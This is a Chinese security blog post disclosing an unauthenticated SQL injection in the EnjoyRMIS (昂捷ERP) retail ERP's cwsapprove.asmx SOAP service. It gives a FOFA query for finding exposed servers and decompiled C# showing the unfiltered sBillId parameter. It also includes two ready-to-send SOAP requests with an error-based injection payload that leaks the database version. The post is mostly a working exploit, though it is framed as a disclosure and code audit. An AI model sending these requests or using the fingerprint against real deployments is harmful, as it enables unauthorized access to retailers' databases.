---
title: "昂捷ERP cwsapprove.asmx SQL注入漏洞"
source: https://mrxn.net/jswz/enjoyrmis-ws-approve-cwsapprove-sqli.html
asset_dir: assets/昂捷erp-cwsapprove.asmx-sql注入漏洞
---

# 昂捷ERP cwsapprove.asmx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/3 08:26
- 1239浏览
- [0评论](#comment)
- 25分钟阅读

深入探索

安全

SQL

软件开发

---

# 漏洞简介

EnjoyRMIS系统是由深圳市昂捷信息技术股份有限公司开发的一款面向零售行业的管理信息系统，旨在为超市、便利店、百货、购物中心及专营专卖等零售业态提供全面的数字化解决方案和服务。EnjoyRMIS系统的 /EnjoyRMIS\_WS/WS/Approve/cwsapprove.asmx 接口存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的攻击者可以通过该漏洞获取数据库敏感信息。

企业资源规划

# fofa语法

> body="/Scripts/EnjoyMsg.js"

# 漏洞分析

直接看 GetApproveDataXML 方法的实现

```
[WebMethod]
public string GetApproveDataXML(string sBillId, string sContentType)
{
  this.Init(sContentType);
  return this._cda.GetBillXml(sBillId);
}

public override string GetBillXml(string sId)
{
  string billXml = "";
  Dictionary<string, string> dictionary = new Dictionary<string, string>();
  string str = DBHelperManager.Instance.EnjoyDBType == DBType.Sql ? "(nolock)" : "";
  if (!string.IsNullOrEmpty(this.ApproveTableName))
    dictionary.Add(this.ApproveTableName, string.Format("select a.* from {0} a{2} where a.c_id='{1}';", (object) this.ApproveTableName, (object) sId, (object) str));
  if (!string.IsNullOrEmpty(this.ApproveTableDetailName))
    dictionary.Add(this.ApproveTableDetailName, string.Format("select b.* from {0} b{2} where b.c_id='{1}';", (object) this.ApproveTableDetailName, (object) sId, (object) str));
  if (dictionary.Count > 0)
```

深入探索

云安全解决方案

编程语言教程

安全研究报告

sBillId 无任何过滤校验直接拼接到SQL语句中执行，造成SQL注入漏洞。

SQL注入检测工具

# 漏洞复现

## GetApproveDataXML

```
POST /EnjoyRMIS_WS/WS/Approve/cwsapprove.asmx HTTP/1.1
SOAPAction: http://tempuri.org/GetApproveDataXML
Host: enjoyrmis.mrxn.net

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:GetApproveDataXML>
         <!--type: string-->
         <tem:sBillId>'and 1=@@version--</tem:sBillId>
         <!--type: string-->
         <tem:sContentType>1</tem:sContentType>
      </tem:GetApproveDataXML>
   </soapenv:Body>
</soapenv:Envelope>
```

深入探索

漏洞扫描器

Windows安全工具

SQL注入防护

[![昂捷ERP cwsapprove.asmx SQL注入漏洞](images/img-001-94a1aff24e3a.webp)](https://image.mrxn.net/1b5004c8414e437297ff358793a6c4b4.webp)

成功利用报错注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)获取到数据库版本信息。

代码安全审计

## GetApproveBrief

```
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
SOAPAction: http://tempuri.org/GetOCashById
Content-Type: text/xml;charset=UTF-8
Host: enjoyrmis.mrxn.net

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:GetApproveBrief>
         <!--type: string-->
         <tem:sBillId>'and 1=@@version--</tem:sBillId>
         <!--type: string-->
         <tem:sContentType>1</tem:sContentType>
      </tem:GetApproveBrief>
   </soapenv:Body>
</soapenv:Envelope>
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.fofa语法](#toc-2-)
- [3.漏洞分析](#toc-3-)
- [4.漏洞复现](#toc-4-)
- [4.1.GetApproveDataXML](#toc-4-1-)
- [4.2.GetApproveBrief](#toc-4-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
